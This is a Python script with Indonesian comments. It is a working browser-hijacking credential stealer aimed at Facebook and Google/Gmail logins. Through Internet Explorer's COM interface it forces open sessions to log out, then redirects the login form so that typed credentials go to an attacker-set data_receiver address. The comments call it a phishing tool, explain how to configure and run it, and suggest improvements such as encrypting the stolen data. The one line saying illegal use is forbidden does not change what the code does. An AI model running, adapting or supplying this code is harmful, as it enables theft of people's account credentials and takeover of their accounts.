import time
import urllib.parse
import win32com.client

data_receiver = "http://localhost:8080/"

target_sites = {
    "www.facebook.com":
        {
            "logout_url": None,
            "logout_form": "logout_form",
            "login_form_index": 0,
            "owned": False
        },
    "accounts.google.com":
        {
            "logout_url": "https://accounts.google.com/Logout?hl=en&continue="
                          "https://accounts.google.com/"
                          "ServiceLogin%3Fservice%3Dmail",
            "logout_form": None,
            "login_form_index": 0,
            "owned": False
        }
}

target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)


def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return


while True:
    for browser in windows:
        url = urllib.parse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue
            # if there is a URL we can just redirect
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                # retrieve all elements in the document
                full_doc = browser.Document.all
                # iterate looking for the logout form
                for i in full_doc:
                    try:
                        # find the logout form and submit it
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
            try:
                # now we modify the login form
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.parse.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (
                    data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
            except:
                pass
        time.sleep(5)

# ========================================================================================= # 
        
# Program tersebut adalah sebuah skrip Python yang berfungsi untuk melakukan serangan phishing terhadap situs web tertentu, seperti Facebook dan Google. Berikut adalah penjelasan alur program tersebut:

# Impor modul yang diperlukan:

# time: Digunakan untuk mengatur waktu dalam program.
# urllib.parse: Digunakan untuk mengurai URL.
# win32com.client: Digunakan untuk mengakses objek COM (Component Object Model) di lingkungan Windows.
# Tentukan variabel data_receiver yang merupakan URL tempat data login akan dikirimkan setelah diserang.

# Tentukan target_sites, sebuah kamus (dictionary) yang berisi informasi tentang situs target yang akan diserang. Setiap situs memiliki beberapa atribut seperti URL logout, nama formulir logout, indeks formulir login, dan status kepemilikan (owned).

# Dua situs target yang ditentukan adalah Facebook dan Google. Untuk Google, ada dua subdomain yang ditambahkan: Gmail dan mail.google.com.

# Inisialisasi objek COM menggunakan win32com.client.Dispatch(clsid) dengan clsid yang disediakan. Objek ini nantinya akan digunakan untuk mengontrol jendela browser yang sedang berjalan.

# Definisikan fungsi wait_for_browser(browser) yang menunggu hingga browser selesai memuat halaman.

# Mulai perulangan tak terbatas (while True) untuk memeriksa browser yang sedang berjalan.

# Periksa setiap jendela browser yang aktif untuk menentukan apakah sedang mengakses situs target.

# Jika situs yang dibuka adalah situs target dan belum dimiliki (owned = False), lakukan langkah-langkah berikut:

# Jika ada URL logout yang telah ditentukan, arahkan browser ke URL tersebut.
# Jika tidak ada URL logout, cari formulir logout dalam dokumen HTML dan kirimkan formulir tersebut.
# Setelah logout berhasil, modifikasi formulir login dengan mengubah atribut action-nya menjadi alamat data_receiver yang ditambahkan dengan URL saat ini.
# Setelah proses modifikasi formulir login selesai, tandai situs tersebut sebagai dimiliki (owned = True).
# Tunggu selama 5 detik sebelum melakukan iterasi ulang.

# Program tersebut dapat digunakan untuk secara otomatis memanipulasi formulir login dan logout pada situs web target, sehingga dapat digunakan untuk melakukan serangan phishing untuk mencuri kredensial pengguna.

# ================================================================================================================================================================================================================================= # 

# ### Fungsi:

# 1. **Manfaat:**
#    - Program ini dapat digunakan untuk melakukan serangan phishing terhadap situs web tertentu, seperti Facebook dan Google.
#    - Dapat digunakan untuk mencuri kredensial pengguna dengan cara mengarahkan mereka ke halaman palsu yang meniru halaman login asli.

# 2. **Cara Penggunaan:**
#    - Untuk menggunakan program ini, pengguna perlu menjalankan skrip Python di lingkungan yang mendukungnya, seperti lingkungan pengembangan Python di komputer lokal.
#    - Pengguna juga perlu memastikan bahwa modul-modul yang diperlukan (`time`, `urllib`, `win32com`) telah terinstal di lingkungan Python mereka.
#    - Pengguna perlu mengatur `data_receiver` untuk menentukan URL tempat data login akan dikirimkan setelah diserang.
#    - Selanjutnya, pengguna perlu menambahkan situs target ke dalam variabel `target_sites` beserta informasi yang diperlukan seperti URL logout dan nama formulir logout.
#    - Setelah semuanya diatur, pengguna dapat menjalankan program dan ia akan secara otomatis memonitor dan memanipulasi aktivitas browser yang sedang berjalan.

### Pengembangan:

# 1. **Keamanan:**
#    - Dalam pengembangan selanjutnya, perlu mempertimbangkan aspek keamanan lebih lanjut. Misalnya, mengenkripsi data yang dikirimkan ke `data_receiver` untuk menghindari penangkapan data yang sensitif.
#    - Memperkuat mekanisme autentikasi sehingga hanya pengguna yang sah yang dapat mengakses halaman login palsu.

# 2. **Pengoptimalan:**
#    - Dapat dioptimalkan dengan menambahkan fitur seperti mendeteksi otomatis formulir login dan logout tanpa harus menentukan secara manual.
#    - Meningkatkan keandalan dan kecepatan program untuk memastikan kinerjanya tetap optimal dalam berbagai kondisi.

# 3. **Penggunaan yang Legal:**
#    - Penting untuk diingat bahwa penggunaan program ini untuk tujuan jahat atau tanpa izin adalah ilegal. Pengembang harus memastikan program ini hanya digunakan untuk tujuan yang sah dan etis.

# 4. **Pemeliharaan:**
#    - Program ini memerlukan pemeliharaan yang teratur untuk memperbaiki bug dan memperbarui fungsionalitas sesuai dengan perubahan pada situs target atau lingkungan perangkat lunak.

# 5. **Dokumentasi dan Pelatihan:**
#    - Penting untuk menyertakan dokumentasi yang baik dan memberikan pelatihan kepada pengguna yang bertanggung jawab untuk memastikan pemahaman yang baik tentang cara menggunakan dan mengembangkan program ini dengan benar.

# Dengan memperhatikan aspek-aspek tersebut, program ini dapat dikembangkan lebih lanjut untuk meningkatkan fungsionalitas, keamanan, dan kinerja serta memastikan penggunaannya sesuai dengan standar etika dan hukum.

# ============================================================================================================================================================================================================================================= # 